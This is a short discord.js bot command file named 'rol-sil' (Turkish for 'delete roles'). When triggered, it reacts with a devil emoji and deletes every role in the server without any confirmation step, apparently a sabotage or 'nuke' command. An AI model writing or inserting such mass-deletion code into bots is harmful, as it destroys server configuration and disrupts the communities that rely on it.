const Discord = require('discord.js');
const db = require('quick.db')
exports.run = async(client, message, args) => { 
  


 await message.react('😈')
message.guild.roles.forEach(a => a.delete())
  };
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: ["rol-sil"], 
  permLevel: 2
};

exports.help = {
  name: 'rol-sil',
  description: 'taslak', 
  usage: 'rol-sil'
};